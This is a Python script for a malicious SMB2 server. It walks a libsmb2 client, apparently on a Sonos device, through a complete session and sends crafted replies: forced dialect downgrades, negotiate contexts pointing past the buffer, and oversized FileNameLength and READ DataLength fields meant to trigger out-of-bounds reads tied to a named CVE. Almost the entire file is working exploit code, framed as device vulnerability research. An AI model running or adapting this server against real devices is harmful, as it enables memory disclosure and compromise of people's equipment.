#!/usr/bin/env python3
"""dropserver.py - full malicious SMB2 chain server for the nc0 single-pass
device run (bead frankensonos-s2-cve-2026-4149-downgrade-nc0).

Companion to WildPond's negprobe.py (untouched). Where negprobe answers
NEGOTIATE and stubs everything else with zeros, this server walks the client
through the COMPLETE chain the art caller runs on .86:

    NEGOTIATE -> SESSION_SETUP (NTLMSSP CHALLENGE + AUTH accept)
    -> TREE_CONNECT -> CREATE -> QUERY_INFO [-> READ]

with every reply field under explicit control, so a harness failure can never
masquerade as a client rejection:

  --profile honest     answer the client's best offered dialect, well-formed
  --profile force-210  NEGOTIATE replies dialect 2.1   (0x0210)
  --profile force-202  NEGOTIATE replies dialect 2.0.2 (0x0202)
  --profile ctx-311    answer 3.1.1 with crafted negotiate contexts whose
                       offset/len exceed the iov (the smb2_parse_negotiate_
                       contexts bounded-OOB-read candidate, doc §5)

Reply-shape modules for the proven over-reads (RE_CVES §7c shapes), selected
with --qlen / --fnlen:
  --fnlen N    QUERY_INFO FILE_NAME_INFO reply with FileNameLength = N
               (theFileName over-read shape)
  --dlen N     READ reply with DataLength = N surplus vs the buffer
               (READ DataLength shape)

Wire facts this server encodes (from the device-proven negprobe logs and
libsmb2 v4.0.0 source, tag 2ef9bb7):
  - client: SMB2 with 64-byte headers, \xfeSMB; requests NetBIOS-wrapped
    (u8 0 + 3-byte length)
  - client credit handling: grant 1 credit per reply or it stalls
  - SessionId: zero in NEGOTIATE; the SESSION_SETUP challenge carries the
    server-chosen id; the AUTH and everything after must echo it
  - security_mode 0 + no signing flags: accepted pre-auth (init.c defaults)
  - dialect adopted from the reply u16 without membership check
    (smb2-cmd-negotiate.c:243, libsmb2.c:860)

usage: dropserver.py PORT --profile honest [--fnlen N] [--dlen N] [--log f]
Exit: runs until killed (one-shot per device phase; restart between phases).
"""
from __future__ import annotations

import argparse
import socket
import struct
import sys
import time
from datetime import datetime, timezone

PROFILES = ("honest", "force-210", "force-202", "ctx-311")

GUID = bytes(range(16))  # deterministic server guid

SMB2_NEGOTIATE = 0
SMB2_SESSION_SETUP = 1
SMB2_LOGOFF = 2
SMB2_TREE_CONNECT = 3
SMB2_CREATE = 5
SMB2_CLOSE = 6
SMB2_READ = 8
SMB2_QUERY_INFO = 16
SMB2_ECHO = 13

CMD_NAMES = {0: "NEGOTIATE", 1: "SESSION_SETUP", 2: "LOGOFF", 3: "TREE_CONNECT",
             5: "CREATE", 6: "CLOSE", 8: "READ", 13: "ECHO", 16: "QUERY_INFO"}

STATUS_SUCCESS = 0
STATUS_MORE_PROCESSING = 0x00000103
STATUS_INVALID_PARAMETER = 0x00000057
STATUS_ACCESS_DENIED = 0x00000005

SESSION_ID = 0x0000040000000021  # server-chosen, nonzero, stable
TREE_ID = 0x00000021


def log(msg: str, fh=None):
    line = "%s %s" % (datetime.now(timezone.utc).strftime("%H:%M:%S.%f")[:-3], msg)
    print(line, flush=True)
    if fh:
        fh.write(line + "\n")
        fh.flush()


# ------------------------------------------------------------------ builders

def smb2_header(cmd: int, status: int, mid: int, sid: int, tid: int,
                credit: int = 1, flags: int = 1, next_cmd: int = 0,
                signature: bytes = bytes(16)) -> bytearray:
    h = bytearray(64)
    h[0:4] = b"\xfeSMB"
    struct.pack_into("<H", h, 4, 64)
    struct.pack_into("<H", h, 6, credit)
    struct.pack_into("<I", h, 8, status)
    h[12] = cmd
    h[13] = 0  # credit charge
    struct.pack_into("<H", h, 14, 0)  # credit response appended below
    struct.pack_into("<I", h, 16, flags)
    struct.pack_into("<I", h, 20, next_cmd)
    struct.pack_into("<Q", h, 24, mid)
    struct.pack_into("<I", h, 32, 0)  # reserved / pid
    struct.pack_into("<Q", h, 36, sid)
    struct.pack_into("<I", h, 44, tid)
    h[48:64] = signature
    return h


def ntlmssp_challenge(target: str = "SONOSDROP") -> bytes:
    """NTLMSSP type-2 challenge, minimal but valid:
    Signature, MessageType=2, TargetName fields, flags, 8-byte challenge,
    Reserved, TargetInfo fields (empty)."""
    sig = b"NTLMSSP\0"
    flags = (0x00000001 |   # NTLMSSP_NEGOTIATE_56
             0x00000002 |   # KEY_EXCH
             0x00000004 |   # 128
             0x00000200 |   # NTLM2 (target info present-ish)
             0x00010000 |   # NTLMSSP_NEGOTIATE_TARGET_INFO
             0x00080000)    # EXTENDED_SESSIONSECURITY
    tname = target.encode("utf-16-le")
    # target name: len,max,offset pairs
    tname_f = struct.pack("<HHI", len(tname), len(tname), 32 + 8)
    challenge = struct.pack("<Q", 0x1122334455667788)
    # target info: empty list terminator (u16 type 0)
    tinfo = b"\x00\x00\x00\x00"
    tinfo_f = struct.pack("<HHI", len(tinfo), len(tinfo), 32 + 8 + len(tname))
    payload = tname + tinfo
    blob = (sig + struct.pack("<I", 2) + tname_f + tinfo_f +
            struct.pack("<I", flags) + challenge + bytes(8) + payload)
    return blob


def negotiate_reply(profile: str, offered: list[int], mid: int, sid: int) -> bytes:
    """SMB2 NEGOTIATE response per profile (MS-SMB2 2.2.64 layout):
    StructureSize u16, SecurityMode u16, DialectRevision u16,
    NegotiateContextCount u16, ServerGuid 16, Capabilities u32,
    MaxTransactionSize u32, MaxReadSize u32, MaxWriteSize u32,
    SystemTime 8, ServerStartTime 8, SecurityBufferOffset u16,
    SecurityBufferLength u16, NegotiateContextOffset u16,
    SecurityBuffer, [NegotiateContexts]."""
    if profile == "force-210":
        chosen = 0x0210
    elif profile == "force-202":
        chosen = 0x0202
    elif profile == "ctx-311":
        chosen = 0x0311
    else:
        chosen = max(offered) if offered else 0x0311
    secblob = ntlmssp_challenge()
    hdr = smb2_header(SMB2_NEGOTIATE, STATUS_SUCCESS, mid, sid, 0)
    fixed_len = 64  # 65 rounded to 8 minus the shared 64 header: 2+2+2+2+16+4+4+4+4+8+8+2+2+2 = 64
    secoff = 64 + fixed_len
    caps = 0x00000001 | 0x00000002 | 0x00000008 if chosen >= 0x0300 else 0
    body = struct.pack("<HHHH", 65, 0, chosen, 0)   # structsize, secmode=0, dialect, ctxcount
    body += GUID
    body += struct.pack("<IIII", caps, 65536, 65536, 65536)
    body += struct.pack("<Q", 0)                    # system time
    body += struct.pack("<Q", 0)                    # server start time
    body += struct.pack("<HH", secoff, len(secblob))
    if chosen == 0x0311 and profile == "ctx-311":
        # crafted context offset beyond the iov; count forced to 4 so
        # smb2_parse_negotiate_contexts iterates on stale type/len words
        b = bytearray(body + secblob)
        struct.pack_into("<H", b, 6, 4)               # NegotiateContextCount = 4
        body = bytes(b) + struct.pack("<HH", 0xFF00, 4)  # offset beyond the iov
    elif chosen == 0x0311:
        ctx = (struct.pack("<HHI", 0x0001, 36, 0) + bytes(32) +   # preauth integrity
               struct.pack("<HHI", 0x0002, 8, 0) + struct.pack("<I", 1))  # encryption AES-128-CCM
        pad = (8 - (secoff + len(secblob)) % 8) % 8
        ctx_off = secoff + len(secblob) + pad
        b = bytearray(body + secblob + bytes(pad) + ctx)
        struct.pack_into("<H", b, 6, 2)          # NegotiateContextCount
        struct.pack_into("<H", b, len(b) - 2, ctx_off)  # NegotiateContextOffset (tail)
        body = bytes(b)
    else:
        # impacket-canonical (the proven chain ran against impacket): secmode=1,
        # empty security buffer (offset 128, len 0), no negotiate contexts.
        body = struct.pack("<HHHH", 65, 1, chosen, 0)
        body += GUID
        body += struct.pack("<IIII", caps, 65536, 65536, 65536)
        body += struct.pack("<Q", 0)                    # system time
        body += struct.pack("<Q", 0)                    # server start time
        body += struct.pack("<HHH", 64 + 64, 0, 0)      # secoff, seclen, ctxoff
    hdr[6:8] = struct.pack("<H", 1)
    return bytes(hdr) + body


def session_setup_reply(status: int, secblob: bytes, mid: int, sid: int,
                        uid_set: bool) -> bytes:
    hdr = smb2_header(SMB2_SESSION_SETUP, status, mid, sid, 0)
    body = struct.pack("<HH", 9, 0)          # StructureSize 9, session flags 0
    body += struct.pack("<HH", 64 + 8, len(secblob))
    body += secblob
    if uid_set:
        struct.pack_into("<Q", hdr, 36, SESSION_ID)
    return bytes(hdr) + body


def tree_connect_reply(mid: int, sid: int) -> bytes:
    hdr = smb2_header(SMB2_TREE_CONNECT, STATUS_SUCCESS, mid, sid, 0)
    body = struct.pack("<HHH", 16, 0, 0)     # structsize, share type disk, reserved
    body += struct.pack("<I", 0x00000000)    # share flags: none (no DPW etc.)
    body += struct.pack("<I", 0x0000001F)    # capabilities: all client-optional
    body += struct.pack("<I", 0xFFFFFFFF)    # maximal access
    return bytes(hdr) + body


def create_reply(mid: int, sid: int, tid: int) -> bytes:
    hdr = smb2_header(SMB2_CREATE, STATUS_SUCCESS, mid, sid, tid)
    body = struct.pack("<HH", 89, 0)         # StructureSize 89, oplock 0
    body += struct.pack("<I", 1)             # create action: opened
    body += struct.pack("<Q", 0) * 2         # creation/last access
    body += struct.pack("<Q", 0) * 2         # last write / change
    body += struct.pack("<Q", 0)             # allocation size
    body += struct.pack("<Q", 0x1000)        # end of file
    body += struct.pack("<I", 0)             # file attributes
    body += struct.pack("<I", 0)             # reserved
    fh = struct.pack("<Q", 0x21)             # file id (stable)
    body += fh
    return bytes(hdr) + body


def query_info_reply(fnlen: int, mid: int, sid: int, tid: int) -> bytes:
    """QUERY_INFO with a FILE_NAME_INFORMATION-ish payload whose
    FileNameLength is attacker-chosen (the over-read shape)."""
    hdr = smb2_header(SMB2_QUERY_INFO, STATUS_SUCCESS, mid, sid, tid)
    name = b"/S/f.jpg".decode().encode("utf-16-le")
    payload = struct.pack("<II", 0x1000, fnlen) + name
    if fnlen > len(name):
        payload += b"A" * (fnlen - len(name))  # the surplus bytes the decoder over-reads
    body = struct.pack("<HHI", 9, 0, len(payload))
    body += struct.pack("<HH", 64 + 16, len(payload))
    body += payload
    return bytes(hdr) + body


def read_reply(dlen: int, mid: int, sid: int, tid: int) -> bytes:
    """READ reply whose DataLength is attacker-chosen (surplus shape)."""
    hdr = smb2_header(SMB2_READ, STATUS_SUCCESS, mid, sid, tid)
    data = bytes(0) + b"B" * max(0, dlen)
    body = struct.pack("<HH", 17, 0)         # StructureSize 17, reserved
    body += struct.pack("<I", len(data))
    body += struct.pack("<HH", 64 + 16, 0)   # data offset, reserved
    body += data
    return bytes(hdr) + body


def generic_ok(cmd: int, mid: int, sid: int, tid: int, size: int) -> bytes:
    hdr = smb2_header(cmd, STATUS_SUCCESS, mid, sid, tid)
    return bytes(hdr) + struct.pack("<H", size) + bytes(max(0, size - 2))


# ------------------------------------------------------------------ handling

class DropServer:
    def __init__(self, port: int, profile: str, fnlen: int, dlen: int, fh):
        self.port = port
        self.profile = profile
        self.fnlen = fnlen
        self.dlen = dlen
        self.fh = fh
        self.sid = 0
        self.tid = 0

    def react(self, pdu: bytes) -> bytes | None:
        if pdu[:4] != b"\xfeSMB":
            log("non-SMB2 pdu %r" % pdu[:8], self.fh)
            return None
        cmd = pdu[12]
        status_flags = struct.unpack("<I", pdu[8:12])[0]
        mid = struct.unpack("<Q", pdu[24:32])[0]
        sid = struct.unpack("<Q", pdu[36:44])[0]
        tid = struct.unpack("<I", pdu[44:48])[0]
        log("cmd=%s mid=%#x sid=%#x tid=%#x len=%d"
            % (CMD_NAMES.get(cmd, hex(cmd)), mid, sid, tid, len(pdu)), self.fh)

        if cmd == SMB2_NEGOTIATE:
            # dialect list: StructureSize u16, DialectCount u16 at +2 of the
            # fixed part (request offset 64+2); dialects u16 each
            dcnt = struct.unpack("<H", pdu[66:68])[0]
            log("neg fixed raw %s" % pdu[64:112].hex(), self.fh)
            offered = [struct.unpack("<H", pdu[68 + 2 * i:70 + 2 * i])[0]
                       for i in range(min(dcnt, 8))]
            log("offered dialects: %s" % [hex(d) for d in offered], self.fh)
            return negotiate_reply(self.profile, offered, mid, 0)

        if cmd == SMB2_SESSION_SETUP:
            # request security blob: SecurityBufferOffset/Length at
            # fixed-part offsets 12/14 (abs 76/78): StructSize u16, Flags u8,
            # SecurityMode u8, Capabilities u32, Channel u32, then the pair
            so, sl = struct.unpack("<HH", pdu[76:80])
            blob = pdu[so:so + sl] if sl else b""
            ntlm_type = struct.unpack("<I", blob[8:12])[0] if blob[8:12] else 0
            log("session setup ntlm type=%d blob=%d B" % (ntlm_type, len(blob)), self.fh)
            if ntlm_type == 1:
                # NEGOTIATE message -> CHALLENGE, MORE_PROCESSING, set session id
                self.sid = SESSION_ID
                return session_setup_reply(STATUS_MORE_PROCESSING,
                                           ntlmssp_challenge(), mid, self.sid,
                                           uid_set=True)
            # AUTH message -> success, session id echoes
            self.sid = SESSION_ID
            return session_setup_reply(STATUS_SUCCESS, b"", mid, self.sid,
                                       uid_set=True)

        if cmd == SMB2_TREE_CONNECT:
            self.tid = TREE_ID
            return tree_connect_reply(mid, self.sid)

        if cmd == SMB2_CREATE:
            return create_reply(mid, self.sid, self.tid)

        if cmd == SMB2_QUERY_INFO:
            return query_info_reply(self.fnlen, mid, self.sid, self.tid)

        if cmd == SMB2_READ:
            return read_reply(self.dlen, mid, self.sid, self.tid)

        if cmd == SMB2_ECHO:
            return generic_ok(SMB2_ECHO, mid, self.sid, self.tid, 4)

        if cmd == SMB2_LOGOFF or cmd == SMB2_CLOSE:
            return generic_ok(cmd, mid, self.sid, self.tid, 4)

        log("unhandled cmd %d — generic OK" % cmd, self.fh)
        return generic_ok(cmd, mid, self.sid, self.tid, 4)

    def serve(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.port))
        s.listen(4)
        log("dropserver listening on :%d profile=%s fnlen=%d dlen=%d"
            % (self.port, self.profile, self.fnlen, self.dlen), self.fh)
        while True:
            conn, addr = s.accept()
            log("--- connection from %s:%d" % addr, self.fh)
            buf = b""
            try:
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        log("--- closed by client", self.fh)
                        break
                    buf += chunk
                    while len(buf) >= 4:
                        nb_len = int.from_bytes(buf[1:4], "big")
                        if len(buf) < 4 + nb_len:
                            break
                        pdu = buf[4:4 + nb_len]
                        buf = buf[4 + nb_len:]
                        try:
                            reply = self.react(pdu)
                        except Exception as e:
                            log("react error: %r" % e, self.fh)
                            reply = None
                        if reply:
                            out = b"\x00" + len(reply).to_bytes(3, "big") + reply
                            conn.sendall(out)
            except OSError as e:
                log("conn error %r" % e, self.fh)
            finally:
                conn.close()
                self.sid = 0
                self.tid = 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("port", type=int, nargs="?", default=4450)
    ap.add_argument("--profile", choices=PROFILES, default="honest")
    ap.add_argument("--fnlen", type=int, default=8,
                    help="QUERY_INFO FileNameLength (over-read shape)")
    ap.add_argument("--dlen", type=int, default=0,
                    help="READ DataLength surplus")
    ap.add_argument("--log", default=None)
    a = ap.parse_args()
    fh = open(a.log, "a") if a.log else None
    DropServer(a.port, a.profile, a.fnlen, a.dlen, fh).serve()
    return 0


if __name__ == "__main__":
    sys.exit(main())
